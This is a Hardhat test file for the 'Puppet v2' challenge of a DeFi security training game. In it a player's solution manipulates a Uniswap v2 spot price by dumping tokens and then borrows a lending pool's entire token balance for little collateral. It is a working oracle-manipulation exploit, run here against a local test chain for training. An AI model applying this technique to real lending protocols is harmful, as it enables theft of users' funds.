const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require("hardhat");
const { expect, assert } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { constants } = require("ethers");

describe("[Challenge] Puppet v2", function () {
  let deployer, player;
  let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
  const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

  const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(
      PLAYER_INITIAL_ETH_BALANCE
    );

    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.bytecode,
      deployer
    );
    const UniswapRouterFactory = new ethers.ContractFactory(
      routerJson.abi,
      routerJson.bytecode,
      deployer
    );
    const UniswapPairFactory = new ethers.ContractFactory(
      pairJson.abi,
      pairJson.bytecode,
      deployer
    );

    // Deploy tokens to be traded
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    weth = await (await ethers.getContractFactory("WETH", deployer)).deploy();

    // Deploy Uniswap Factory and Router
    uniswapFactory = await UniswapFactoryFactory.deploy(
      ethers.constants.AddressZero
    );
    uniswapRouter = await UniswapRouterFactory.deploy(
      uniswapFactory.address,
      weth.address
    );

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapRouter.addLiquidityETH(
      token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    );
    uniswapExchange = await UniswapPairFactory.attach(
      await uniswapFactory.getPair(token.address, weth.address)
    );
    expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetV2Pool", deployer)
    ).deploy(
      weth.address,
      token.address,
      uniswapExchange.address,
      uniswapFactory.address
    );

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

    // Check pool's been correctly setup
    expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(
      3n * 10n ** 17n
    );
    expect(
      await lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.eq(300000n * 10n ** 18n);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    let pair = await uniswapFactory.getPair(token.address, weth.address);
    let pairContract = new ethers.Contract(pair, pairJson.abi, player);

    assert.equal(await pairContract.token1(), weth.address);

    let connected_Uniswap = await uniswapRouter.connect(player);
    let approveWeth = await weth
      .connect(player)
      .approve(uniswapRouter.address, constants.MaxUint256);

    let approvetoken = await token
      .connect(player)
      .approve(uniswapRouter.address, constants.MaxUint256);
    // Tx deadline
    const deadline = Math.floor(Date.now() / 1000 + 20 * 60);
    let swap1 =
      await connected_Uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
        await token.balanceOf(player.address),
        1,
        [token.address, weth.address],
        player.address,
        deadline + 500
      );

    let [_reserves0, _reserves1] = await pairContract.getReserves();

    console.log("DVT Reserve after swap:", _reserves0.toString() / 1e18);
    console.log("ETH Reserve after swap:", _reserves1.toString() / 1e18);
    let playerETHreserve = await ethers.provider.getBalance(player.address);
    console.log("Player ETH  after swap", playerETHreserve.toString() / 1e18);

    let depositNeeded = await lendingPool.calculateDepositOfWETHRequired(
      await token.balanceOf(lendingPool.address)
    );
    console.log("deposit needed", depositNeeded.toString() / 1e18);
    await weth.connect(player).deposit({ value: depositNeeded });
    await weth.connect(player).approve(lendingPool.address, depositNeeded);
    await lendingPool
      .connect(player)
      .borrow(await token.balanceOf(lendingPool.address));
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0);

    expect(await token.balanceOf(player.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
